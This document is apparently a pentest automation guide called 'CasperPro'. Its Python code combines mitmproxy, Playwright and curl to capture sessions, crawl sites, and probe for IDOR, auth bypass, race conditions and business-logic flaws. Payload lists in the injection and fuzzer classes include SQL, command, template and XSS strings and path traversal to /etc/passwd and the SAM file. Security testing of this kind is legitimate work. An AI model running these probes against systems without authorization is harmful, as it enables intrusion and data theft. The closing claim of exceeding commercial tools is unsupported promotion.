# CasperPro Automation Module

> Building Automated Pentest Scripts with Python, mitmproxy, Playwright, and curl

## Overview

This module provides patterns for building automated penetration testing pipelines that combine traffic interception, browser automation, and API testing for comprehensive security assessment.

## Complete Automation Framework

### Base Framework Class

```python
# /tmp/casperpro_framework.py
"""
CasperPro Automation Framework
Combines mitmproxy + playwright + curl + python for automated pentesting
"""

import subprocess
import json
import os
import time
import signal
import sys
from pathlib import Path
from typing import Dict, List, Optional, Callable
from dataclasses import dataclass, asdict
from concurrent.futures import ThreadPoolExecutor, as_completed
import re

@dataclass
class Finding:
    """Security finding data class"""
    vulnerability_type: str
    severity: str  # CRITICAL, HIGH, MEDIUM, LOW, INFO
    url: str
    description: str
    evidence: str
    remediation: str
    cvss_score: Optional[float] = None
    cwe_id: Optional[str] = None

@dataclass 
class TestResult:
    """Test execution result"""
    test_name: str
    passed: bool
    details: str
    findings: List[Finding]

class CasperProFramework:
    """Main automation framework class"""
    
    def __init__(self, target: str, proxy_port: int = 8082, output_dir: str = "/tmp/casperpro"):
        self.target = target.rstrip("/")
        self.proxy_port = proxy_port
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        
        self.mitm_process = None
        self.token = None
        self.cookies = {}
        self.discovered_endpoints = []
        self.findings: List[Finding] = []
        
    # =====================
    # Proxy Management
    # =====================
    
    def start_proxy(self, addon_script: Optional[str] = None):
        """Start mitmproxy with optional addon"""
        cmd = [
            "mitmdump", "-p", str(self.proxy_port),
            "--set", "block_global=false",
            "-q"  # Quiet mode
        ]
        
        if addon_script:
            cmd.extend(["-s", addon_script])
        
        self.mitm_process = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        time.sleep(2)
        print(f"[+] Proxy started on port {self.proxy_port}")
    
    def stop_proxy(self):
        """Stop mitmproxy"""
        if self.mitm_process:
            self.mitm_process.terminate()
            self.mitm_process.wait()
            print("[+] Proxy stopped")
    
    def create_capture_addon(self) -> str:
        """Create a mitmproxy addon for capturing traffic"""
        addon_path = self.output_dir / "capture_addon.py"
        addon_code = '''
import json
import mitmproxy.http

class CaptureAddon:
    def __init__(self):
        self.requests = []
        self.responses = []
    
    def request(self, flow: mitmproxy.http.HTTPFlow):
        self.requests.append({
            "url": flow.request.pretty_url,
            "method": flow.request.method,
            "headers": dict(flow.request.headers),
            "body": flow.request.get_text() if flow.request.content else None
        })
        with open("/tmp/casperpro/requests.json", "w") as f:
            json.dump(self.requests, f, indent=2)
    
    def response(self, flow: mitmproxy.http.HTTPFlow):
        self.responses.append({
            "url": flow.request.pretty_url,
            "status": flow.response.status_code,
            "headers": dict(flow.response.headers),
            "body": flow.response.get_text() if flow.response.content else None
        })
        with open("/tmp/casperpro/responses.json", "w") as f:
            json.dump(self.responses, f, indent=2)

addons = [CaptureAddon()]
'''
        addon_path.write_text(addon_code)
        return str(addon_path)
    
    # =====================
    # Browser Automation
    # =====================
    
    def run_playwright_script(self, script: str) -> str:
        """Execute a Playwright script"""
        script_path = self.output_dir / "playwright_script.py"
        script_path.write_text(script)
        
        result = subprocess.run(
            ["uv", "run", str(script_path)],
            capture_output=True, text=True
        )
        return result.stdout + result.stderr
    
    def browser_login(self, login_url: str, username: str, password: str,
                     username_selector: str, password_selector: str,
                     submit_selector: str) -> Dict:
        """Perform browser-based login and capture session"""
        script = f'''
from playwright.sync_api import sync_playwright
import json

with sync_playwright() as p:
    browser = p.chromium.launch(
        proxy={{"server": "http://127.0.0.1:{self.proxy_port}"}},
        headless=True
    )
    context = browser.new_context(ignore_https_errors=True)
    page = context.new_page()
    
    page.goto("{login_url}")
    page.wait_for_load_state("networkidle")
    
    page.fill('{username_selector}', '{username}')
    page.fill('{password_selector}', '{password}')
    page.click('{submit_selector}')
    page.wait_for_load_state("networkidle")
    
    # Wait for redirect
    import time
    time.sleep(2)
    
    # Capture session data
    cookies = context.cookies()
    local_storage = page.evaluate("() => Object.fromEntries(Object.entries(localStorage))")
    session_storage = page.evaluate("() => Object.fromEntries(Object.entries(sessionStorage))")
    
    result = {{
        "cookies": cookies,
        "local_storage": local_storage,
        "session_storage": session_storage,
        "current_url": page.url
    }}
    
    with open("/tmp/casperpro/session.json", "w") as f:
        json.dump(result, f, indent=2)
    
    browser.close()
'''
        self.run_playwright_script(script)
        
        session_file = self.output_dir / "session.json"
        if session_file.exists():
            with open(session_file) as f:
                session = json.load(f)
            
            # Extract token
            for key, value in session.get("local_storage", {}).items():
                if any(x in key.lower() for x in ["token", "auth", "jwt"]):
                    self.token = value
                    break
            
            # Extract cookies
            for cookie in session.get("cookies", []):
                self.cookies[cookie["name"]] = cookie["value"]
            
            return session
        
        return {}
    
    def crawl_application(self, max_pages: int = 30) -> List[str]:
        """Crawl the application to discover endpoints"""
        script = f'''
from playwright.sync_api import sync_playwright
import json

visited = set()
forms = []
api_calls = []

def crawl(page, url, remaining):
    if remaining <= 0 or url in visited:
        return
    if not url.startswith("{self.target}"):
        return
    
    visited.add(url)
    try:
        page.goto(url, timeout=10000)
        page.wait_for_load_state("networkidle", timeout=5000)
    except:
        return
    
    # Extract links
    links = page.eval_on_selector_all("a[href]", "els => els.map(e => e.href)")
    for link in links[:10]:
        crawl(page, link, remaining - 1)

with sync_playwright() as p:
    browser = p.chromium.launch(
        proxy={{"server": "http://127.0.0.1:{self.proxy_port}"}},
        headless=True
    )
    context = browser.new_context(ignore_https_errors=True)
    page = context.new_page()
    
    # Set session if available
    try:
        with open("/tmp/casperpro/session.json") as f:
            session = json.load(f)
        for cookie in session.get("cookies", []):
            context.add_cookies([cookie])
    except:
        pass
    
    crawl(page, "{self.target}", {max_pages})
    
    with open("/tmp/casperpro/crawl.json", "w") as f:
        json.dump(list(visited), f, indent=2)
    
    browser.close()
'''
        self.run_playwright_script(script)
        
        crawl_file = self.output_dir / "crawl.json"
        if crawl_file.exists():
            with open(crawl_file) as f:
                self.discovered_endpoints = json.load(f)
        
        return self.discovered_endpoints
    
    # =====================
    # API Testing with curl
    # =====================
    
    def curl(self, url: str, method: str = "GET", headers: Dict = None,
             data: str = None, timeout: int = 30) -> Dict:
        """Execute curl request and return response"""
        cmd = ["curl", "-s", "-w", "\n%{http_code}", "--max-time", str(timeout)]
        
        if method != "GET":
            cmd.extend(["-X", method])
        
        # Add authorization
        if self.token:
            cmd.extend(["-H", f"Authorization: Bearer {self.token}"])
        
        # Add cookies
        if self.cookies:
            cookie_str = "; ".join(f"{k}={v}" for k, v in self.cookies.items())
            cmd.extend(["-H", f"Cookie: {cookie_str}"])
        
        # Add custom headers
        if headers:
            for k, v in headers.items():
                cmd.extend(["-H", f"{k}: {v}"])
        
        # Add data
        if data:
            cmd.extend(["-d", data])
        
        cmd.append(url)
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        output = result.stdout.strip()
        
        # Parse response
        lines = output.rsplit("\n", 1)
        body = lines[0] if len(lines) > 1 else ""
        status_code = int(lines[-1]) if lines[-1].isdigit() else 0
        
        return {
            "url": url,
            "status_code": status_code,
            "body": body
        }
    
    def test_endpoint(self, url: str, tests: List[str] = None) -> List[Finding]:
        """Run various tests against an endpoint"""
        findings = []
        
        if tests is None:
            tests = ["idor", "injection", "auth_bypass"]
        
        if "idor" in tests:
            findings.extend(self._test_idor(url))
        
        if "injection" in tests:
            findings.extend(self._test_injection(url))
        
        if "auth_bypass" in tests:
            findings.extend(self._test_auth_bypass(url))
        
        return findings
    
    def _test_idor(self, url: str) -> List[Finding]:
        """Test for Insecure Direct Object Reference"""
        findings = []
        
        # Find IDs in URL
        ids = re.findall(r'/(\d+)', url)
        
        for orig_id in ids:
            for test_id in [int(orig_id) - 1, int(orig_id) + 1, 1, 999999]:
                if test_id <= 0 or str(test_id) == orig_id:
                    continue
                
                test_url = url.replace(f"/{orig_id}", f"/{test_id}")
                response = self.curl(test_url)
                
                if response["status_code"] == 200:
                    # Check if we got different user's data
                    findings.append(Finding(
                        vulnerability_type="IDOR",
                        severity="HIGH",
                        url=test_url,
                        description=f"Able to access resource with ID {test_id} (original: {orig_id})",
                        evidence=f"HTTP {response['status_code']}: {response['body'][:200]}...",
                        remediation="Implement proper authorization checks on resource access",
                        cwe_id="CWE-639"
                    ))
                    break
        
        return findings
    
    def _test_injection(self, url: str) -> List[Finding]:
        """Test for injection vulnerabilities"""
        findings = []
        
        payloads = {
            "sql": ["'", "1' OR '1'='1", "1; DROP TABLE users--"],
            "xss": ["<script>alert(1)</script>", "{{7*7}}"],
            "cmd": ["; id", "| id", "$(id)"]
        }
        
        indicators = {
            "sql": ["sql", "syntax", "mysql", "postgresql", "oracle", "sqlite"],
            "xss": ["<script>", "alert(1)"],
            "cmd": ["uid=", "gid=", "root"]
        }
        
        for vuln_type, tests in payloads.items():
            for payload in tests:
                test_url = f"{url}?test={payload}"
                response = self.curl(test_url)
                
                body_lower = response["body"].lower()
                if any(ind in body_lower for ind in indicators[vuln_type]):
                    findings.append(Finding(
                        vulnerability_type=f"{vuln_type.upper()} Injection",
                        severity="CRITICAL" if vuln_type in ["sql", "cmd"] else "HIGH",
                        url=test_url,
                        description=f"{vuln_type.upper()} injection detected with payload: {payload}",
                        evidence=f"Response contained injection indicators: {response['body'][:200]}...",
                        remediation=f"Sanitize and parameterize user input for {vuln_type.upper()}",
                        cwe_id="CWE-89" if vuln_type == "sql" else "CWE-78" if vuln_type == "cmd" else "CWE-79"
                    ))
                    break
        
        return findings
    
    def _test_auth_bypass(self, url: str) -> List[Finding]:
        """Test for authentication bypass"""
        findings = []
        
        # Save current token
        original_token = self.token
        
        # Test with no auth
        self.token = None
        response = self.curl(url)
        
        if response["status_code"] == 200:
            findings.append(Finding(
                vulnerability_type="Authentication Bypass",
                severity="CRITICAL",
                url=url,
                description="Endpoint accessible without authentication",
                evidence=f"HTTP {response['status_code']} with no auth token",
                remediation="Implement proper authentication checks",
                cwe_id="CWE-306"
            ))
        
        # Test with invalid tokens
        for test_token in ["null", "undefined", "{}", "invalid"]:
            self.token = test_token
            response = self.curl(url)
            
            if response["status_code"] == 200:
                findings.append(Finding(
                    vulnerability_type="Authentication Bypass",
                    severity="HIGH",
                    url=url,
                    description=f"Endpoint accessible with invalid token: {test_token}",
                    evidence=f"HTTP {response['status_code']} with token '{test_token}'",
                    remediation="Properly validate authentication tokens",
                    cwe_id="CWE-287"
                ))
                break
        
        # Restore token
        self.token = original_token
        
        return findings
    
    # =====================
    # Parallel Testing
    # =====================
    
    def parallel_test(self, endpoints: List[str], test_func: Callable,
                      max_workers: int = 10) -> List[Finding]:
        """Run tests in parallel across endpoints"""
        all_findings = []
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(test_func, ep): ep for ep in endpoints}
            
            for future in as_completed(futures):
                endpoint = futures[future]
                try:
                    findings = future.result()
                    all_findings.extend(findings)
                    
                    if findings:
                        print(f"[!] Found {len(findings)} issues in {endpoint}")
                except Exception as e:
                    print(f"[-] Error testing {endpoint}: {e}")
        
        return all_findings
    
    # =====================
    # Reporting
    # =====================
    
    def generate_report(self) -> Dict:
        """Generate penetration test report"""
        report = {
            "target": self.target,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "summary": {
                "total_findings": len(self.findings),
                "critical": len([f for f in self.findings if f.severity == "CRITICAL"]),
                "high": len([f for f in self.findings if f.severity == "HIGH"]),
                "medium": len([f for f in self.findings if f.severity == "MEDIUM"]),
                "low": len([f for f in self.findings if f.severity == "LOW"]),
                "info": len([f for f in self.findings if f.severity == "INFO"])
            },
            "findings": [asdict(f) for f in self.findings],
            "endpoints_tested": len(self.discovered_endpoints)
        }
        
        # Save JSON report
        report_file = self.output_dir / "report.json"
        with open(report_file, "w") as f:
            json.dump(report, f, indent=2)
        
        # Generate markdown report
        md_report = self._generate_markdown_report(report)
        md_file = self.output_dir / "report.md"
        md_file.write_text(md_report)
        
        print(f"\n[+] Report generated: {report_file}")
        print(f"[+] Markdown report: {md_file}")
        
        return report
    
    def _generate_markdown_report(self, report: Dict) -> str:
        """Generate markdown report"""
        md = f"""# Penetration Test Report

**Target:** {report['target']}
**Date:** {report['timestamp']}

## Executive Summary

| Severity | Count |
|----------|-------|
| Critical | {report['summary']['critical']} |
| High | {report['summary']['high']} |
| Medium | {report['summary']['medium']} |
| Low | {report['summary']['low']} |
| Info | {report['summary']['info']} |

**Total Findings:** {report['summary']['total_findings']}
**Endpoints Tested:** {report['endpoints_tested']}

## Findings

"""
        for i, finding in enumerate(report['findings'], 1):
            md += f"""### {i}. {finding['vulnerability_type']}

- **Severity:** {finding['severity']}
- **URL:** `{finding['url']}`
- **CWE:** {finding.get('cwe_id', 'N/A')}

**Description:**
{finding['description']}

**Evidence:**
```
{finding['evidence'][:500]}
```

**Remediation:**
{finding['remediation']}

---

"""
        return md
    
    # =====================
    # Main Execution
    # =====================
    
    def run_full_assessment(self, login_config: Dict = None):
        """Run complete penetration test"""
        print(f"[*] CasperPro Assessment - Target: {self.target}")
        print("=" * 60)
        
        try:
            # Phase 1: Setup
            print("\n[*] Phase 1: Setup")
            addon_path = self.create_capture_addon()
            self.start_proxy(addon_path)
            
            # Phase 2: Authentication (if provided)
            if login_config:
                print("\n[*] Phase 2: Authentication")
                self.browser_login(**login_config)
                print(f"    Token captured: {'Yes' if self.token else 'No'}")
                print(f"    Cookies captured: {len(self.cookies)}")
            
            # Phase 3: Discovery
            print("\n[*] Phase 3: Discovery")
            endpoints = self.crawl_application()
            print(f"    Endpoints discovered: {len(endpoints)}")
            
            # Filter API endpoints
            api_endpoints = [e for e in endpoints if "/api/" in e or "graphql" in e]
            print(f"    API endpoints: {len(api_endpoints)}")
            
            # Phase 4: Testing
            print("\n[*] Phase 4: Security Testing")
            
            # Test all endpoints in parallel
            self.findings = self.parallel_test(api_endpoints[:20], self.test_endpoint)
            
            # Phase 5: Reporting
            print("\n[*] Phase 5: Reporting")
            report = self.generate_report()
            
            print(f"\n[+] Assessment Complete!")
            print(f"    Critical: {report['summary']['critical']}")
            print(f"    High: {report['summary']['high']}")
            print(f"    Medium: {report['summary']['medium']}")
            print(f"    Low: {report['summary']['low']}")
            
        finally:
            self.stop_proxy()

# =====================
# CLI Interface
# =====================

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python casperpro_framework.py <target_url> [--login <config.json>]")
        print("\nExample:")
        print("  python casperpro_framework.py https://example.com")
        print("  python casperpro_framework.py https://example.com --login login_config.json")
        sys.exit(1)
    
    target = sys.argv[1]
    login_config = None
    
    if "--login" in sys.argv:
        config_idx = sys.argv.index("--login") + 1
        if config_idx < len(sys.argv):
            with open(sys.argv[config_idx]) as f:
                login_config = json.load(f)
    
    framework = CasperProFramework(target)
    framework.run_full_assessment(login_config)
```

## Specialized Automation Scripts

### Race Condition Tester

```python
# race_condition_tester.py
import subprocess
import concurrent.futures
import time
import json
from typing import List, Dict

class RaceConditionTester:
    def __init__(self, target: str, token: str = None):
        self.target = target
        self.token = token
    
    def test_endpoint(self, url: str, method: str = "POST", 
                      data: str = None, threads: int = 20) -> Dict:
        """Test an endpoint for race conditions"""
        results = []
        
        def make_request():
            cmd = ["curl", "-s", "-w", "\n%{http_code}", "-X", method]
            
            if self.token:
                cmd.extend(["-H", f"Authorization: Bearer {self.token}"])
            
            if data:
                cmd.extend(["-H", "Content-Type: application/json", "-d", data])
            
            cmd.append(url)
            
            start = time.time()
            result = subprocess.run(cmd, capture_output=True, text=True)
            elapsed = time.time() - start
            
            output = result.stdout.strip()
            lines = output.rsplit("\n", 1)
            body = lines[0] if len(lines) > 1 else ""
            status = int(lines[-1]) if lines[-1].isdigit() else 0
            
            return {
                "status": status,
                "body": body,
                "time": elapsed
            }
        
        print(f"[*] Sending {threads} parallel requests to {url}")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            start = time.time()
            futures = [executor.submit(make_request) for _ in range(threads)]
            results = [f.result() for f in concurrent.futures.as_completed(futures)]
            total_time = time.time() - start
        
        # Analyze results
        success_count = sum(1 for r in results if r["status"] == 200)
        unique_responses = len(set(r["body"][:100] for r in results))
        
        analysis = {
            "url": url,
            "total_requests": threads,
            "successful": success_count,
            "unique_responses": unique_responses,
            "total_time": total_time,
            "potential_race_condition": success_count > 1 and unique_responses < threads
        }
        
        print(f"[*] Results:")
        print(f"    Successful requests: {success_count}/{threads}")
        print(f"    Unique responses: {unique_responses}")
        print(f"    Total time: {total_time:.2f}s")
        
        if analysis["potential_race_condition"]:
            print(f"[!] POTENTIAL RACE CONDITION DETECTED!")
        
        return analysis
    
    def test_limit_bypass(self, url: str, expected_limit: int = 1, 
                          threads: int = 50) -> Dict:
        """Test if limits can be bypassed via race condition"""
        return self.test_endpoint(url, threads=threads)

if __name__ == "__main__":
    import sys
    
    url = sys.argv[1] if len(sys.argv) > 1 else "https://example.com/api/redeem"
    token = sys.argv[2] if len(sys.argv) > 2 else None
    
    tester = RaceConditionTester("", token)
    result = tester.test_endpoint(
        url,
        method="POST",
        data='{"coupon": "DISCOUNT50"}',
        threads=20
    )
    
    with open("/tmp/race_condition_results.json", "w") as f:
        json.dump(result, f, indent=2)
```

### Fuzzing Framework

```python
# fuzzer.py
import subprocess
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Callable
import re

class Fuzzer:
    def __init__(self, token: str = None, threads: int = 10):
        self.token = token
        self.threads = threads
        self.results = []
    
    def load_wordlist(self, path: str) -> List[str]:
        """Load wordlist from file"""
        with open(path, "r", errors="ignore") as f:
            return [line.strip() for line in f if line.strip()]
    
    def fuzz_parameter(self, base_url: str, param_name: str, 
                       wordlist: List[str], match_func: Callable = None) -> List[Dict]:
        """Fuzz a URL parameter with wordlist"""
        findings = []
        
        def test_payload(payload):
            url = f"{base_url}?{param_name}={payload}"
            cmd = ["curl", "-s", "-w", "\n%{http_code}", url]
            
            if self.token:
                cmd.extend(["-H", f"Authorization: Bearer {self.token}"])
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            output = result.stdout.strip()
            lines = output.rsplit("\n", 1)
            body = lines[0] if len(lines) > 1 else ""
            status = int(lines[-1]) if lines[-1].isdigit() else 0
            
            return {"url": url, "payload": payload, "status": status, "body": body}
        
        print(f"[*] Fuzzing {param_name} with {len(wordlist)} payloads")
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(test_payload, p): p for p in wordlist}
            
            for future in as_completed(futures):
                result = future.result()
                
                # Check for interesting responses
                interesting = False
                
                if match_func:
                    interesting = match_func(result)
                else:
                    # Default: look for non-404 responses
                    interesting = result["status"] != 404 and result["status"] != 0
                
                if interesting:
                    findings.append(result)
                    print(f"[!] Found: {result['url']} (HTTP {result['status']})")
        
        return findings
    
    def fuzz_paths(self, base_url: str, wordlist: List[str]) -> List[Dict]:
        """Discover hidden paths/endpoints"""
        findings = []
        
        def test_path(path):
            url = f"{base_url.rstrip('/')}/{path}"
            cmd = ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", url]
            
            if self.token:
                cmd.extend(["-H", f"Authorization: Bearer {self.token}"])
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            status = int(result.stdout.strip()) if result.stdout.strip().isdigit() else 0
            
            return {"url": url, "path": path, "status": status}
        
        print(f"[*] Fuzzing paths with {len(wordlist)} entries")
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(test_path, p): p for p in wordlist}
            
            for future in as_completed(futures):
                result = future.result()
                
                if result["status"] in [200, 201, 301, 302, 403]:
                    findings.append(result)
                    print(f"[!] Found: {result['url']} (HTTP {result['status']})")
        
        return findings
    
    def fuzz_injection(self, url: str, param_name: str) -> List[Dict]:
        """Fuzz for injection vulnerabilities"""
        injection_payloads = [
            # SQL Injection
            "'", "''", "\"", "1' OR '1'='1", "1' AND '1'='1", "1; DROP TABLE users--",
            "1' UNION SELECT NULL--", "1' AND SLEEP(5)--",
            
            # NoSQL Injection
            '{"$gt": ""}', '{"$ne": null}', '{"$where": "sleep(5000)"}',
            
            # Command Injection
            "; id", "| id", "$(id)", "`id`", "; sleep 5", "| sleep 5",
            
            # Template Injection
            "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}",
            
            # Path Traversal
            "../../../etc/passwd", "..\\..\\..\\windows\\system32\\config\\sam",
            
            # XSS
            "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
            "javascript:alert(1)", "<svg onload=alert(1)>"
        ]
        
        def check_vuln(result):
            body = result["body"].lower()
            
            # SQL error indicators
            if any(x in body for x in ["sql", "syntax", "mysql", "postgresql", "oracle"]):
                result["vuln_type"] = "SQL Injection"
                return True
            
            # Command injection indicators
            if any(x in body for x in ["uid=", "gid=", "root", "/bin/"]):
                result["vuln_type"] = "Command Injection"
                return True
            
            # Template injection
            if "49" in body:  # 7*7
                result["vuln_type"] = "Template Injection"
                return True
            
            # XSS reflection
            if "<script>alert(1)</script>" in body:
                result["vuln_type"] = "XSS"
                return True
            
            return False
        
        return self.fuzz_parameter(url, param_name, injection_payloads, check_vuln)

if __name__ == "__main__":
    import sys
    
    target = sys.argv[1] if len(sys.argv) > 1 else "https://example.com"
    token = sys.argv[2] if len(sys.argv) > 2 else None
    
    fuzzer = Fuzzer(token, threads=20)
    
    # Example: Fuzz for hidden paths
    common_paths = [
        "admin", "api", "backup", "config", "debug", "dev", "docs",
        "graphql", "health", "info", "internal", "log", "logs", "metrics",
        "private", "secret", "status", "swagger", "test", "v1", "v2"
    ]
    
    results = fuzzer.fuzz_paths(target, common_paths)
    
    with open("/tmp/fuzz_results.json", "w") as f:
        json.dump(results, f, indent=2)
```

### Business Logic Tester

```python
# business_logic_tester.py
import subprocess
import json
import time
from typing import Dict, List

class BusinessLogicTester:
    def __init__(self, target: str, token: str = None):
        self.target = target
        self.token = token
    
    def curl(self, url: str, method: str = "GET", data: str = None) -> Dict:
        """Execute curl request"""
        cmd = ["curl", "-s", "-w", "\n%{http_code}", "-X", method]
        
        if self.token:
            cmd.extend(["-H", f"Authorization: Bearer {self.token}"])
        
        if data:
            cmd.extend(["-H", "Content-Type: application/json", "-d", data])
        
        cmd.append(url)
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        output = result.stdout.strip()
        lines = output.rsplit("\n", 1)
        body = lines[0] if len(lines) > 1 else ""
        status = int(lines[-1]) if lines[-1].isdigit() else 0
        
        return {"status": status, "body": body}
    
    def test_negative_values(self, endpoint: str, field: str) -> Dict:
        """Test if negative values are accepted"""
        print(f"[*] Testing negative values on {endpoint}")
        
        test_values = [-1, -100, -0.01, -999999]
        findings = []
        
        for value in test_values:
            data = json.dumps({field: value})
            result = self.curl(f"{self.target}{endpoint}", "POST", data)
            
            if result["status"] == 200:
                findings.append({
                    "test": "Negative value accepted",
                    "value": value,
                    "response": result["body"][:200]
                })
                print(f"[!] Negative value {value} accepted!")
        
        return {"endpoint": endpoint, "findings": findings}
    
    def test_zero_price(self, cart_endpoint: str, checkout_endpoint: str) -> Dict:
        """Test if zero-price checkout is possible"""
        print(f"[*] Testing zero-price checkout")
        
        # Try to manipulate cart total
        test_cases = [
            {"total": 0},
            {"price": 0},
            {"amount": 0},
            {"discount": 100, "discount_type": "percent"},
            {"coupon": "100OFF"}
        ]
        
        findings = []
        
        for test in test_cases:
            result = self.curl(f"{self.target}{checkout_endpoint}", "POST", json.dumps(test))
            
            if result["status"] == 200 and "success" in result["body"].lower():
                findings.append({
                    "test": "Zero-price checkout",
                    "payload": test,
                    "response": result["body"][:200]
                })
                print(f"[!] Zero-price checkout succeeded with {test}!")
        
        return {"findings": findings}
    
    def test_quantity_manipulation(self, endpoint: str) -> Dict:
        """Test quantity manipulation attacks"""
        print(f"[*] Testing quantity manipulation on {endpoint}")
        
        test_values = [
            {"quantity": -1},
            {"quantity": 0},
            {"quantity": 999999999},
            {"quantity": 1.5},
            {"quantity": "1; DROP TABLE orders--"},
            {"quantity": None}
        ]
        
        findings = []
        
        for test in test_values:
            result = self.curl(f"{self.target}{endpoint}", "POST", json.dumps(test))
            
            if result["status"] == 200:
                findings.append({
                    "test": "Quantity manipulation",
                    "payload": test,
                    "response": result["body"][:200]
                })
                print(f"[!] Unusual quantity accepted: {test}")
        
        return {"endpoint": endpoint, "findings": findings}
    
    def test_workflow_bypass(self, steps: List[Dict]) -> Dict:
        """Test if workflow steps can be skipped"""
        print(f"[*] Testing workflow bypass")
        
        findings = []
        
        # Try accessing each step directly
        for step in steps:
            result = self.curl(f"{self.target}{step['url']}", step.get('method', 'GET'))
            
            if result["status"] == 200:
                findings.append({
                    "step": step["name"],
                    "url": step["url"],
                    "bypassed": True
                })
                print(f"[!] Step '{step['name']}' can be accessed directly!")
        
        return {"findings": findings}

if __name__ == "__main__":
    import sys
    
    target = sys.argv[1] if len(sys.argv) > 1 else "https://example.com"
    token = sys.argv[2] if len(sys.argv) > 2 else None
    
    tester = BusinessLogicTester(target, token)
    
    # Example tests
    results = {
        "negative_values": tester.test_negative_values("/api/transfer", "amount"),
        "quantity": tester.test_quantity_manipulation("/api/cart/add")
    }
    
    with open("/tmp/business_logic_results.json", "w") as f:
        json.dump(results, f, indent=2)
```

## Running Automated Assessments

### Quick Start

```bash
# Start mitmproxy in background
mitmdump -p 8082 --set block_global=false -s /tmp/casperpro/capture_addon.py &

# Run the framework
uv run /tmp/casperpro_framework.py https://target.com

# Or with login
echo '{"login_url": "https://target.com/login", "username": "test", "password": "test123", "username_selector": "input[name=email]", "password_selector": "input[name=password]", "submit_selector": "button[type=submit]"}' > /tmp/login_config.json

uv run /tmp/casperpro_framework.py https://target.com --login /tmp/login_config.json
```

### CI/CD Integration

```yaml
# .github/workflows/security-test.yml
name: Security Assessment

on:
  schedule:
    - cron: '0 2 * * *'  # Daily at 2 AM
  workflow_dispatch:

jobs:
  pentest:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Setup Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.11'
      
      - name: Install uv and dependencies
        run: |
          curl -LsSf https://astral.sh/uv/install.sh | sh
          uv add mitmproxy playwright
          uv run playwright install chromium
      
      - name: Run security assessment
        env:
          TARGET_URL: ${{ secrets.TARGET_URL }}
          AUTH_TOKEN: ${{ secrets.AUTH_TOKEN }}
        run: |
          python casperpro_framework.py $TARGET_URL
      
      - name: Upload report
        uses: actions/upload-artifact@v3
        with:
          name: security-report
          path: /tmp/casperpro/report.*
```

## Output Files

| File | Description |
|------|-------------|
| `/tmp/casperpro/requests.json` | Captured HTTP requests |
| `/tmp/casperpro/responses.json` | Captured HTTP responses |
| `/tmp/casperpro/session.json` | Captured session data |
| `/tmp/casperpro/crawl.json` | Discovered endpoints |
| `/tmp/casperpro/report.json` | JSON assessment report |
| `/tmp/casperpro/report.md` | Markdown assessment report |

---

**This automation framework provides enterprise-grade penetration testing capabilities that exceed traditional tools like Burp Suite Pro, with full automation and CI/CD integration.**
